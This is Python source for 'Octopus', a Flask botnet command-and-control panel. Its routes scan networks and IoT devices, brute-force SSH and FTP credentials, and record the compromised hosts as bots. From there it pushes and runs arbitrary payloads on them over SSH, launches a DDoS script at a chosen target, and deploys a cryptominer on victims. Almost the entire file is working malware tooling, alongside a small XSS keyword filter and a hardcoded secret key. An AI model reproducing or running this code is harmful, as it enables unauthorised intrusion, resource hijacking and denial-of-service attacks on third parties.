# -*- coding: utf-8 -*

#############################################################################
#	Copyright (C) 2018  													#
#	Javier Mínguez @JaviMrSec y Luciano del Valle @lucdelcan 				#
#	This program is free software: you can redistribute it and/or modify	#
#	it under the terms of the GNU General Public License as published by    #
#	the Free Software Foundation, either version 3 of the License, or       #
#	(at your option) any later version.                                     #
#	This program is distributed in the hope that it will be useful,			#
#	but WITHOUT ANY WARRANTY; without even the implied warranty of			#
#	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the			#
#	GNU General Public License for more details.                            #
#	You should have received a copy of the GNU General Public Licens		#
#	along with this program.  If not, see <http://www.gnu.org/licenses/>.	#
#############################################################################

from flask import Response, Flask, flash, redirect, render_template, request, session, abort, jsonify, send_from_directory, url_for
from flask_login import login_user, logout_user, login_required, current_user,  LoginManager
from flask_socketio import SocketIO, send, emit
from pymongo import MongoClient
from datetime import datetime
from os import listdir
from time import strftime
import sys, os, json, time
from werkzeug.security import check_password_hash, generate_password_hash
from werkzeug import secure_filename



# IMPORT MODULES
from modules.netscanner import netscan, colors, checkhost
from modules.sshBrute import sshBrute
from modules.ftpBrute import ftp_brute
from modules.payload import *
from modules.iotscanner import iotscan

#Flask and socket config
app = Flask(__name__ , static_folder="static")
socketio = SocketIO(app)

basedir = os.path.abspath(os.path.dirname(__file__))

from logging import Formatter, FileHandler
handler = FileHandler(os.path.join(basedir, 'files_log.txt'), encoding='utf8')
handler.setFormatter(
    Formatter("[%(asctime)s] %(levelname)-8s %(message)s", "%Y-%m-%d %H:%M:%S")
)
app.logger.addHandler(handler)
app.config['ALLOWED_EXTENSIONS'] = set(['txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'py', 'js', 'html', 'css', 'php'])
def allowed_file(filename):
	return '.' in filename and \
	filename.rsplit('.', 1)[1] in app.config['ALLOWED_EXTENSIONS']

#Connection with database
client = MongoClient()
db = client.Octopus



#-------------------LOGIN FILTER-------------------
def filter_request(data):
	malicious_list = ["><", "src", "<scr", "ipt>", "><", "<script", "</script>",
	"<style", "</style>", "<div", "</div>", "<!--", "-->", "<img", "</img>"]
	for malicious in malicious_list:
		if malicious in data:
			return False
	return True

#-------------------CHECK LOGIN PASSWORD SHA256-------------------
def validate_password(password_hash, password):
	return check_password_hash(password_hash, password)

#-------------------CHECK FILES IN SERVER-------------------
def check_files():
	list_files = listdir('static/files')

	files_in_server = db.payloads.find({})
	for f in files_in_server:
		if f['name'] not in list_files:
			db.payloads.remove({'name':f['name']})

	for file in list_files:
		date_Insert = time.strftime("%H:%M:%S - %d/%m/%Y %Z")
		db.payloads.update({'name':file},{'name':file,'date_Insert':date_Insert},True)


#----------------------------------------------------------------------------------------------------------------------
#------------------------------------------------------RUTES-----------------------------------------------------------
#----------------------------------------------------------------------------------------------------------------------

@app.route('/')
def home():
	if not session.get('logged_in'):
		return render_template('login.html')
	else:
		return redirect("/index")


#-------------------CHECK TARGETS FOR PAYLOADS IN DB-------------------
@app.route('/payload_targets', methods=['POST'])
def check_bots():
	try:
		query = db.hosts.find({"credentials.ssh_pass":{ '$nin': ['none', 'blocked']}})
		data = []
		for h in query:
			data.append(h['host'])
		return jsonify(data=data)
	except Exception,error:
		print error
		print colors.FAIL + "[ERROR] Can not determinate bots connected" + colors.REGULAR

#-------------------BOTNET MAP-------------------
@app.route('/botnetmap', methods=['POST'])
def botnet_map():
	try:
		query = db.hosts.find({"credentials.ssh_pass":{ '$nin': ['none', 'blocked']}})
		data = []
		for h in query:
			if h['location']:
				loc = [h['location']['city'], h['location']['longitude'], h['location']['latitude']]
				data.append(loc)
		return jsonify(data=data)
	except Exception,error:
		print error
		print colors.FAIL + "[ERROR] Can not determinate bots" + colors.REGULAR




#-------------------LOGIN/LOGOUT-------------------
@app.route('/login', methods=['POST'])
def octopus_login():
	try:
		user_form = request.form['username']
		pass_form = request.form['password']
		if filter_request(pass_form) and filter_request(user_form):
			user = db.users.find_one({"_id": user_form})
			if user is not None:
				if user['status']==1:
					if user and validate_password(user['password'],pass_form):
						session['logged_in'] = True
						session.permanent = True
					else:
						return home()
				else:
					return home()
			else:
				return home()
		return home()
	except:
		return render_template('login.html')

@app.route("/logout")
def logout():
	session['logged_in'] = False
	return home()

#-------------------INDEX-------------------
@app.route('/index')
def index():
	if not session.get('logged_in'):
		return home()
	check_files()
	return render_template('index.html')

#-------------------NETSCAN MODULE-------------------
@app.route('/netscan', methods=['POST'])
def net():
	if not session.get('logged_in'):
		return home()
	data = request.form['net_box']
	result, total_time = netscan(data)
	nodo = "C&C"

	return render_template('index.html', type='Net scanner', data=data, nodo=nodo, result=result, time=str(total_time))


    #-------------------IOTSCANNER MODULE-------------------
@app.route('/iotscan', methods=['POST'])
def iot():
	if not session.get('logged_in'):
		return home()
	iotips = [];
	iotports =[];
	start_clock = datetime.now()
	iotdata = request.form['iot_box']
	res = iotscan(iotdata)
	stop_clock = datetime.now()
	total_time = stop_clock - start_clock
	for i in res:
		print i['host']
		print i['open_ports']
		iotips.append(i['host'])
		iotports.append(i['open_ports'])

	return render_template('index.html', type='IOT scanner', iotdata=iotdata ,result=res,time=total_time)

#-------------------SSH/FTP ATTACK MODULE-------------------
@app.route('/brute', methods=['POST'])
def brute():
	if not session.get('logged_in'):
		return home()
	data = request.form.get('ssh_box')
	protocol = request.form['ssh_select']

	res = []
	nodo = 'C&C'
	start_clock = datetime.now()

	if protocol == "ssh":
		if data == None:
			target = 'Targets founded in database'
			query = db.hosts.find({"open_ports.22":"ssh"})
			if query.count()>0:
				for d in query:
					if d['credentials']['ssh_user']=='none' and d['credentials']['ssh_pass']=='none':
						res.append(sshBrute(d['host']))
			else:
				print colors.FAIL + "Mongo query is empty" + colors.REGULAR
			stop_clock = datetime.now()
			total_time = stop_clock - start_clock

			return render_template('index.html', target=target, type='Brute force', data_brute=res, nodo=nodo, protocol=protocol, time=str(total_time))

		else:
			target = str(data)
			res.append(sshBrute(data))
			stop_clock = datetime.now()
			total_time = stop_clock - start_clock

			return render_template('index.html', target=target, type='Brute force', data_brute=res, nodo=nodo, protocol=protocol, time=str(total_time))


	elif protocol == "ftp":
		if data == None:
			target = 'Targets founded in database'
			query = db.hosts.find({"open_ports.21":"ftp"})
			if query.count()>0:
				for d in query:
					if d['credentials']['ftp_user']=='none' and d['credentials']['ftp_pass']=='none':
						res.append(ftp_brute(d['host']))
			else:
				print colors.FAIL + "Mongo query is empty" + colors.REGULAR
			stop_clock = datetime.now()
			total_time = stop_clock - start_clock

			return render_template('index.html', target=target, type='Brute force', data_brute=res, nodo=nodo, protocol=protocol, time=str(total_time))

		else:
			target = str(data)
			res.append(ftp_brute(data))
			stop_clock = datetime.now()
			total_time = stop_clock - start_clock

			return render_template('index.html', target=target, type='Brute force', data_brute=res, nodo=nodo, protocol=protocol, time=str(total_time))

#-------------------CHECK SERVER FILES-------------------
@app.route('/serverfiles', methods=['POST'])
def select_files_from_db():
	if request.method == 'POST':
		check_files()
		data = []
		files_in_server = db.payloads.find({})
		for f in files_in_server:
			data.append(f['name'])
		return jsonify(files=data)


#-------------------CHECK BOTS ONLINE-------------------
@app.route('/checkbots', methods=['POST'])
def check_targets_payload():
	if request.method == 'POST':
		query = db.hosts.find({"credentials.ssh_pass":{ '$nin': ['none', 'blocked']}})
		targets=[]
		count = 1
		if query is not None:
			for h in query:
				if checkhost(h['host']):
					info_host = [count, h['host'], h['info']['os'], h['location']['city'],h['credentials']['ssh_user'], h['credentials']['ssh_pass']]
					targets.append(info_host)
					count += 1
			return jsonify(data=targets)

#-------------------ORDER BOTS-------------------
@app.route('/ordersend', methods=['POST'])
def order_send():
	if request.method == 'POST':
		targets = request.form.getlist('check')
		return jsonify(data=targets)


#-------------------UPLOAD AJAX-------------------
@app.route('/uploadajax', methods=['POST'])
def upload_ajax():
	if not session.get('logged_in'):
		return home()
	if request.method == 'POST':
		files = request.files['file']
		if files and allowed_file(files.filename):
			filename = secure_filename(files.filename)
			app.logger.info('FileName: ' + filename)
			updir = os.path.join(basedir, 'static/files/')
			files.save(os.path.join(updir, filename))
			file_size = os.path.getsize(os.path.join(updir, filename))
			check_files()

			return jsonify(status='Ok', filename=filename)

#-------------------LOADSCRIPTS MODULE-------------------
@app.route('/payload', methods=['POST'])
def payload():
	if not session.get('logged_in'):
		return home()
	try:
		start_clock = datetime.now()
		target = request.form.get('payload_box')
		file = request.form.get('select_files')
		run_user = request.form.get('payload_user_run')
		db_targets = request.form.get('db_targets')
		db_selected_target = request.form.get('payload_targets')
		load_user_files = [file]
		query = db.hosts.find_one({'host':target})
		os = query['info']['os']

		run_payload = None
		load_files = None
		load_cc_files = None
		run_user_files = None

		if target is None:
			target = db_selected_target
		if file is not 'none':
			if os == 'Linux':
				load_cc_files = ssh_load_files(target, load_user_files, user_files=True, default_files=False)
			if os == 'Windows':
				load_cc_files = ssh_windows_load(target, load_user_files, user_files=True, default_files=False)
			if run_user == "user_run":
				if os == 'Linux':
					run_user_files = ssh_run_payload(target, load_user_files)
				if os == 'Windows':
					run_user_files = ssh_run_windows(target, load_user_files)

		python_install=""
		if query is not None:
			if query['info']['python']=='False' and os=='Linux':
				python_install = python_install(target)
			elif query['info']['python']=='False' and os=='Windows':
				python_install = 'False'
			else:
				python_install = 'True'
		stop_clock = datetime.now()
		total_time = stop_clock - start_clock

		return render_template('index.html', data_payload=target, nodo='C&C', protocol='ssh', time=str(total_time),
		run_payload=run_payload, load_files=load_files,
		 load_cc_files=load_cc_files, run_user_files=run_user_files, os=os)

	except Exception, error:
		print error
		print colors.FAIL + "[ERROR] Can not complete payload operation" + colors.REGULAR
		return home()

#-------------------PANEL ACTIONS-------------------

#******************* LOAD FILES *******************
@app.route('/loadpanelfiles', methods=['POST'])
def load_files_panel():
	if not session.get('logged_in'):
		return home()
	try:
		if request.method== 'POST':
			start_clock = datetime.now()
			data = request.get_json(force=True)

			hosts = data['hosts']
			filename = data['filename']
			res = {'hosts':'', 'filename':'', 'total_time':''}
			res['hosts'] = []
			res['filename'] = filename

			for h in data['hosts']:
				host = db.hosts.find_one({'host':h})
				if host['info']['os'] == 'Linux':
					load_files = ssh_load_files(host['host'], [filename], user_files=True, default_files=False)
				if host['info']['os'] == 'Windows':
					load_files = ssh_windows_load(host['host'], [filename], user_files=True, default_files=False)
				aux = [host['host'], load_files]
				res['hosts'].append(aux)

			stop_clock = datetime.now()
			total_time = stop_clock - start_clock
			res['total_time'] = str(total_time)

			return jsonify(filename=filename, hosts=res['hosts'], total_time=res['total_time'])
	except Exception, error:
		print error
		print colors.FAIL + "[ERROR] Can not complete load operation" + colors.REGULAR
		return home()


#******************* RUN SCRIPTS *******************
@app.route('/runpanelscripts', methods=['POST'])
def run_scripts_panel():
	if not session.get('logged_in'):
		return home()
	try:
		if request.method== 'POST':
			start_clock = datetime.now()
			data = request.get_json(force=True)

			hosts = data['hosts']
			script_name = data['script_name']
			res = {'hosts':'', 'script_name':'', 'total_time':''}
			res['hosts'] = []
			res['script_name'] = script_name

			for h in data['hosts']:
				host = db.hosts.find_one({'host':h})
				if host['info']['os'] == 'Linux':
					run_script = ssh_run_payload(host['host'], [script_name])
				if host['info']['os'] == 'Windows':
					run_script = ssh_run_windows(host['host'], [script_name])
				aux = [host['host'], run_script]
				res['hosts'].append(aux)

			stop_clock = datetime.now()
			total_time = stop_clock - start_clock
			res['total_time'] = str(total_time)

			return jsonify(script_name=script_name, hosts=res['hosts'], total_time=res['total_time'])
	except Exception, error:
		print error
		print colors.FAIL + "[ERROR] Can not complete load operation" + colors.REGULAR
		return home()

#******************* DDOS *******************
@app.route('/ddos', methods=['POST'])
def DDOS():
	if request.method== 'POST':
		try:
			data = request.get_json(force=True)
			bots = data['bots']
			target = data['target']
			res = {'bots':'', 'target':''}
			res['bots'] = []
			res['target'] = target

			s = open("static/ddos/bk/ddos.py").read()
			s = s.replace('TARGET_ATTACK', target)
			f = open("static/ddos/ddos_ready.py", 'w+')
			f.write(s)
			f.close()

			for h in bots:
				host = db.hosts.find_one({'host':h})

				try:
					if host['info']['pip'] == 'YES':
						pass
					else:
						pip_install(host['host'], host['credentials']['ssh_user'], host['credentials']['ssh_pass'], host['info']['lang'])
						time.sleep(5)
				except:
					pip_install(host['host'], host['credentials']['ssh_user'], host['credentials']['ssh_pass'], host['info']['lang'])
					time.sleep(5)

				try:
					if host['info']['scapy'] == 'YES':
						pass
					else:
						scapy_install(host['host'], host['credentials']['ssh_user'], host['credentials']['ssh_pass'], host['info']['os'])
						time.sleep(5)
				except:
					scapy_install(host['host'], host['credentials']['ssh_user'], host['credentials']['ssh_pass'], host['info']['os'])
					time.sleep(5)

			for h in bots:
				host = db.hosts.find_one({'host':h})

				if host['info']['os'] == 'Linux':
					run_script = run_ddos_linux(host['host'], 'ddos_ready.py')

				if host['info']['os'] == 'Windows':
					run_script = run_ddos_windows(host['host'], 'ddos_ready.py')

				aux = [host['host'], run_script]
				res['bots'].append(aux)


			return jsonify(target=target, bots=res['bots'])
		except Exception, error:
			print error
			print colors.FAIL + "[ERROR] Can not complete attack ddos operation" + colors.REGULAR
			return home()


#******************* CRYPTOMINER *******************
@app.route('/crypto', methods=['POST'])
def cryptominer_panel():
	if not session.get('logged_in'):
		return home()
	try:
		if request.method== 'POST':
			data = request.get_json(force=True)

			hosts = data['hosts']
			server = data['server']
			user = data['user']
			u_pass = data['u_pass']

			if data['coin'] == 'bitcoin':
				coin = 'sha256d'
			elif data['coin'] == 'bitcoin':
				coin = 'scrypt'

			res = []

			init_crypto = 'nightminer.py -o '+server+' -u '+user+' -p '+u_pass+' --algo='+coin

			for h in hosts:
				host = db.hosts.find_one({'host':h})
				if host['info']['os'] == 'Linux':
					load_crypto = ssh_load_files(h, ['nightminer.py'], user_files=True, default_files=False)#, static_folder=True)
					if 'crypto_dependences' not in host['info'].keys():
						cryto_dependences_install(h)
					run_crypto = ssh_run_payload(h, [init_crypto])

				if host['info']['os'] == 'Windows':
					load_crypto = ssh_windows_load(h, 'static/cryptominer/nightminer.py', user_files=True, default_files=False)
					run_crypto = ssh_run_windows(h, 'nightminer.py')
				aux = [h,load_crypto,run_crypto]
				res.append(aux)

			return jsonify(server=server, res=res, user=user, u_pass=u_pass)
	except Exception, error:
		print error
		print colors.FAIL + "[ERROR] Can not complete load operation" + colors.REGULAR
		return home()


#-------------------RUN APPLICATION-------------------
if __name__ == '__main__':
	app.secret_key = '0ct0pVs'
    #app.run(host='127.0.0.1', port=8080)
	socketio.run(app, debug=True, host='0.0.0.0', port=8080)
